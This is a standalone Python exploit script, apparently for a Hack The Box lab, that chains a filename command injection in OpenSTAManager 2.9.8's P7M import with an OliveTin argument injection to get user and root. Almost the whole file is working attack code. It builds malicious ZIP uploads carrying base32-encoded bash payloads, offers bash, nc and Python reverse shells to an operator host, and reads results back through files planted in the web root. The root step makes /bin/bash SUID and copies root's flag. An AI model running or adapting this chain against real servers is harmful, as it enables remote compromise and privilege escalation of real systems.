#!/usr/bin/env python3
"""Standalone OpenSTAManager 2.9.8 P7M RCE (CVE-2025-69212) -> user + root.

Isolated from the full recon so it iterates in seconds. The 2.9.8 decodeP7M runs
  exec('openssl smime ... -in "'.$file.'" ...')   # $file double-quoted, unescaped
so a ZIP entry named z$(<base32 cmd>|base32 -d|bash).p7m runs commands. HTB boxes
usually block outbound, so we don't use a reverse shell: the payload WRITES its
output to a web-served file under the docroot and we fetch it over HTTP. Then it
reads user.txt and, if a root-owned OliveTin is on 127.0.0.1:1337, fires
CVE-2026-27626 for root.txt.

    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s
    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s 14 48

Optional 4th/5th args pin the module/plugin id. Run from the HTB VPN host.
Authorized targets only.
"""
import base64
import io
import os
import re
import socket
import sys
import threading
import time
import urllib.parse
import urllib.request
import http.cookiejar
import zipfile

UA = "Mozilla/5.0 osm"


def log(tag, msg):
    c = {"+": "\033[92m", "!": "\033[91m", "*": "\033[96m", ".": "\033[90m"}.get(tag, "")
    print(f"  {c}[{tag}]\033[0m {msg}")


# ---- HTTP session -------------------------------------------------------
def session():
    jar = http.cookiejar.CookieJar()
    o = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    o.addheaders = [("User-Agent", UA)]
    return o


def get(o, url):
    try:
        with o.open(url, timeout=15) as r:
            return r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.read(200000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""


def post(o, url, data, headers=None):
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h)
    try:
        with o.open(req, timeout=20) as r:
            return r.status, r.read(300000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read(200000).decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception as e:
        return None, str(e)


# ---- login --------------------------------------------------------------
def login(o, base, user, pw):
    page = get(o, base + "/index.php")
    if "brute" in page.lower() and "badge-danger" in page.lower():
        log("!", "app is brute-locked right now (timeout page) — wait / reset box")
        return False
    st, body = post(o, base + "/index.php?op=login",
                    urllib.parse.urlencode({"op": "login", "username": user,
                                            "password": pw}).encode())
    home = get(o, base + "/index.php").lower()
    ok = ("logout" in home or "id_module=" in home) and 'name="password"' not in home
    log("+" if ok else "!", f"login {user}:{pw} -> {'OK' if ok else 'FAILED'}")
    return ok


# ---- plugin discovery ---------------------------------------------------
def find_plugins(o, base):
    """Return ALL (mid, pid) candidates that look like the importFE_ZIP plugin,
    strongest first. 'fattura' alone is too generic (it's an invoicing app), so
    we require an import/FE-ZIP-specific marker and a real id_plugin."""
    home = get(o, base + "/index.php")
    mids = list(dict.fromkeys(re.findall(r"id_module=(\d+)", home)))
    strong = ("importfe", "fe_zip", "importa fe", "importazione fe", "blob1",
              ".p7m", "p7m")
    cands = []
    for mid in mids:
        page = get(o, f"{base}/controller.php?id_module={mid}").lower()
        score = sum(k in page for k in strong)
        pids = re.findall(r"id_plugin=(\d+)", page)
        if score and pids:
            for pid in dict.fromkeys(pids):
                cands.append((score, mid, pid))
    cands.sort(reverse=True)
    out = [(m, p) for _s, m, p in cands]
    if out:
        log("+", "importFE_ZIP candidates: "
            + ", ".join(f"{m}/{p}" for m, p in out[:6]))
    else:
        log("!", "no importFE_ZIP module matched; will try scryer's known 14/21")
        out = [("14", "21")]
    return out


# ---- payload / upload ---------------------------------------------------
def p7m_name(cmd):
    b32 = base64.b32encode(cmd.encode()).decode()
    return "z$(echo${IFS}" + b32 + "|base32${IFS}-d|bash).p7m"


def zip_of(entry, extra_name=None, extra_data=b""):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr(entry, b"<?xml version='1.0'?><x/>")
        if extra_name:
            z.writestr(extra_name, extra_data)
    return buf.getvalue()


def multipart(field, fname, content):
    b = "----osm" + base64.b16encode(zip_of("x")[:6]).decode()
    pre = ("--" + b + "\r\n"
           f'Content-Disposition: form-data; name="{field}"; filename="{fname}"\r\n'
           "Content-Type: application/octet-stream\r\n\r\n")
    return (pre.encode() + content + f"\r\n--{b}--\r\n".encode(),
            "multipart/form-data; boundary=" + b)


def upload(o, base, mid, pid, cmd):
    """Upload the malicious ZIP. To keep the injected .p7m FILENAME short (a long
    base32 command would blow past the 255-byte filename limit and the entry
    would never be created), the command is STAGED as a second ZIP entry and the
    .p7m just finds+runs it. Both files extract into the import dir together, so
    when decodeP7M runs the .p7m the stager script is already on disk."""
    cfile = "sc" + os.urandom(5).hex()          # short staged-command filename
    stager = f"bash $(find /var/www /tmp -name {cfile} 2>/dev/null|head -1) 2>/dev/null"
    entry = p7m_name(stager)                     # short, base32-wrapped
    zbytes = zip_of(entry, cfile, cmd.encode())
    body, ct = multipart("blob1", "invoice.zip", zbytes)
    url = f"{base}/actions.php?op=save&id_module={mid}&id_plugin={pid}"
    st, resp = post(o, url, body,
                    {"Content-Type": ct, "X-Requested-With": "XMLHttpRequest"})
    return st, resp


# ---- output-file channel (no egress needed) ----------------------------
# HTB boxes commonly block outbound, so instead of a reverse connection we make
# the payload WRITE command output to a web-served file and we fetch it. base_dir()
# is the docroot (/var/www/html/openstamanager) and the import dir lives under it
# at <docroot>/<plugin upload_directory>. We don't know that subdir, so the
# payload writes into the dir our OWN .p7m was extracted to (found at runtime,
# guaranteed writable + web-served) plus a comprehensive fixed list, and we probe
# the matching URLs.
DOCROOT = "/var/www/html/openstamanager"
# (filesystem subdir, url subpath) — url must end with '/' (or be '')
KNOWN = [
    ("", ""), ("files", "files/"), ("files/importFE", "files/importFE/"),
    ("files/importFE_ZIP", "files/importFE_ZIP/"),
    ("files/import", "files/import/"),
    ("files/Fatture di vendita", "files/Fatture%20di%20vendita/"),
    ("files/Importazione FE", "files/Importazione%20FE/"),
    ("plugins/importFE_ZIP", "plugins/importFE_ZIP/"),
    ("plugins/importFE_ZIP/uploads", "plugins/importFE_ZIP/uploads/"),
    ("tmp", "tmp/"), ("backup", "backup/"), ("logs", "logs/"),
    ("uploads", "uploads/"), ("assets", "assets/"),
]


def run_cmd(o, base, mid, pid, _lhost, cmd, wait=9):
    """Exfil via the plugin's own `download` action (op=download&file_id=N). It
    getFileList()-globs *.xml* in the SALES import dir — the exact dir our .p7m
    extracts into — and streams the chosen file's CONTENT. So we WRITE the
    command output (marker + output) as a .xml file there, then download by
    index until we get the one carrying our marker. No egress, no reliance on a
    served docroot. Returns the output after the marker."""
    marker = "SX" + os.urandom(4).hex()
    name = marker + ".xml"
    # Write the output where nginx will serve it back: a self-updating app keeps
    # its docroot files www-data-writable, so APPEND to known-served files and
    # drop new files beside them. Also shotgun writable dirs as a fallback.
    served = ["CHANGELOG.md", "composer.json", "package.json", "composer.lock",
              "README.md", f"{marker}.txt"]
    sh_served = " ".join(f'"{s}"' for s in served)
    payload = "\n".join([
        f'{{ echo {marker}; {cmd}; echo {marker}_END; }} > /tmp/.{marker} 2>/dev/null',
        f'for f in {sh_served}; do cat /tmp/.{marker} >> "{DOCROOT}/$f" 2>/dev/null; done',
        'DIRS=$(find /var/www /tmp -maxdepth 7 -type d -writable 2>/dev/null)',
        'for d in $DIRS; do',
        f'  cp /tmp/.{marker} "$d/{name}" 2>/dev/null',
        'done',
        f'rm -f /tmp/.{marker} 2>/dev/null',
    ])
    upload(o, base, mid, pid, payload)
    deadline = time.time() + wait
    while time.time() < deadline:
        # 1) read our marker appended to a served docroot file
        for f in served:
            body = get(o, base + "/" + f)
            if marker in body and marker + "_END" in body:
                seg = body.split(marker, 1)[1]
                return seg.split(marker + "_END", 1)[0].strip()
        # 2) op=download from the sales import dir by index
        for fid in range(0, 40):
            body = get(o, f"{base}/actions.php?op=download&id_module={mid}"
                          f"&id_plugin={pid}&file_id={fid}")
            if marker in body:
                return body.split(marker, 1)[1].strip()
        # 3) any served+writable KNOWN dir
        for _s, up in KNOWN:
            body = get(o, base + "/" + up + name)
            if marker in body:
                return body.split(marker, 1)[1].strip()
        time.sleep(0.6)
    return ""


def rev_shell(o, base, mid, pid, lhost, lport, method="bash"):
    """Inject a reverse shell for a listener the operator runs (nc -lvnp PORT).
    The definitive test of whether the box allows outbound at all."""
    payloads = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash2": f"exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read l; do $l >&5 2>&5; done",
        "nc": f"nc {lhost} {lport} -e /bin/bash",
        "py": ("python3 -c 'import socket,subprocess,os;s=socket.socket();"
               f"s.connect((\"{lhost}\",{lport}));"
               "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
               "subprocess.call([\"/bin/bash\",\"-i\"])'"),
    }
    log("*", f"injecting {method} reverse shell -> {lhost}:{lport} "
             "(catch it with: nc -lvnp " + str(lport) + ")")
    upload(o, base, mid, pid, payloads.get(method, payloads["bash"]))


def lhost_for(base):
    host = urllib.parse.urlparse(base).hostname
    ip = socket.gethostbyname(host)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((ip, 80))
        return s.getsockname()[0]
    finally:
        s.close()


def run_rev(o, base, mid, pid, lhost, cmd, wait=18):
    """Reverse-exec via the stager: the payload connects back to us and pipes
    `cmd` output over the socket. Works only if the box can reach lhost, but the
    stager guarantees the (now unbounded) payload actually runs."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 0))
    port = srv.getsockname()[1]
    srv.listen(1)
    srv.settimeout(wait)
    out = {}

    def serve():
        try:
            conn, _ = srv.accept()
            conn.settimeout(wait)
            buf = b""
            while True:
                try:
                    d = conn.recv(4096)
                except socket.timeout:
                    break
                if not d:
                    break
                buf += d
            out["d"] = buf
            conn.close()
        except Exception:
            pass
        finally:
            srv.close()

    t = threading.Thread(target=serve, daemon=True)
    t.start()
    time.sleep(0.3)
    payload = (f"exec 3<>/dev/tcp/{lhost}/{port} && {{ {cmd} ; }} >&3 2>&3 ; "
               "exec 3>&- 3<&-")
    upload(o, base, mid, pid, payload)
    t.join(timeout=wait + 2)
    return out.get("d", b"").decode("utf-8", "replace")


def exec_confirmed(o, base, mid, pid, seconds=6):
    """Timing oracle: if a `sleep N` payload delays the response by ~N, code
    execution is proven regardless of whether we can read output back."""
    payload = f"sleep {seconds}"
    t0 = time.time()
    upload(o, base, mid, pid, payload)
    return (time.time() - t0) >= seconds - 1


# ---- OliveTin root ------------------------------------------------------
def olivetin_root_run(run):
    log("*", "checking for a local OliveTin (127.0.0.1:1337) …")
    listening = run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
    if ":1337" not in listening:
        log(".", "no OliveTin on :1337 — root step skipped")
        return ""
    log("+", "OliveTin on 127.0.0.1:1337 — firing CVE-2026-27626 (mysqldump inj)")
    inject = ("x' ; chmod u+s /bin/bash ; cp /root/root.txt /tmp/.rf 2>/dev/null ; "
              "chmod 644 /tmp/.rf 2>/dev/null ; #")
    import json
    body = json.dumps({"actionId": "Backup Database",
                       "arguments": {"db_pass": inject}})
    fire = (f"curl -s -m 8 -X POST http://127.0.0.1:1337/api/StartActionAndWait "
            f"-H 'Content-Type: application/json' -d {json.dumps(body)}")
    run(fire)
    return run(
                   "cat /tmp/.rf 2>/dev/null; /bin/bash -p -c 'id; cat /root/root.txt'")


# ---- main ---------------------------------------------------------------
def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)
    base = sys.argv[1].rstrip("/")
    user, pw = sys.argv[2], sys.argv[3]
    log("*", f"target {base}  (output-file channel — no reverse connection)")

    o = session()
    if not login(o, base, user, pw):
        sys.exit(2)

    # explicit module/plugin override: argv[4]=module argv[5]=plugin
    if len(sys.argv) > 5:
        cands = [(sys.argv[4], sys.argv[5])]
        log("*", f"using given module/plugin {cands[0][0]}/{cands[0][1]}")
    else:
        cands = find_plugins(o, base)

    # Confirm code execution per module with a timing oracle (sleep) — this is
    # definitive even when output can't be read back. Then use the module that
    # executes for the output-file channel.
    mid = pid = None
    for m, p in cands[:8]:
        log("*", f"timing-test exec on module {m}/{p} (sleep 6) …")
        if exec_confirmed(o, base, m, p, 6):
            mid, pid = m, p
            log("+", f"CODE EXECUTION CONFIRMED on module {m}/{p} (response delayed)")
            break
        log(".", "  no delay on this module")
    if not mid:
        log("!", "no module delayed on sleep — injection isn't executing. The "
                 "filename may be altered before the openssl exec. Paste this and "
                 "I'll adjust the payload.")
        for m, p in cands[:4]:
            st, resp = upload(o, base, m, p, "id")
            log(".", f"  {m}/{p}: HTTP {st} {resp.strip()[:100]!r}")
        sys.exit(4)

    # Establish an output channel. Try reverse-exec first (now that the stager
    # makes any-length payloads run) then the file-write/op=download fallback.
    lhost = sys.argv[4] if len(sys.argv) > 4 else lhost_for(base)
    runner = None
    log("*", f"trying reverse-exec channel (lhost {lhost}) …")
    if "uid=" in run_rev(o, base, mid, pid, lhost, "id; hostname"):
        log("+", "reverse-exec channel LIVE (box can reach you)")
        runner = lambda c: run_rev(o, base, mid, pid, lhost, c)  # noqa: E731
    else:
        log(".", "no reverse callback — egress likely blocked; trying file-write")
        if "uid=" in run_cmd(o, base, mid, pid, None, "id; hostname"):
            log("+", "file-write/op=download channel LIVE")
            runner = lambda c: run_cmd(o, base, mid, pid, None, c)  # noqa: E731
    if not runner:
        log("!", "exec is proven but no output channel worked. Dumping download "
                 "list for diagnosis:")
        for fid in range(0, 6):
            body = get(o, f"{base}/actions.php?op=download&id_module={mid}"
                          f"&id_plugin={pid}&file_id={fid}")
            log(".", f"  download file_id={fid} -> {body.strip()[:100]!r}")
        sys.exit(5)

    log("+", "RCE output:")
    for ln in runner("id; hostname; pwd").strip().splitlines():
        print("      " + ln)

    flag = runner("cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
    m = re.search(r"[0-9a-f]{32}", flag)
    log("+", f"USER FLAG: {m.group(0)}") if m else \
        log(".", f"user.txt not found; raw: {flag.strip()[:120]!r}")

    root = olivetin_root_run(runner)
    r = re.search(r"[0-9a-f]{32}", root)
    if r:
        log("+", f"ROOT FLAG: {r.group(0)}")
    elif "uid=0" in root:
        log("+", "root shell confirmed (SUID /bin/bash); run `/bin/bash -p`")


if __name__ == "__main__":
    main()
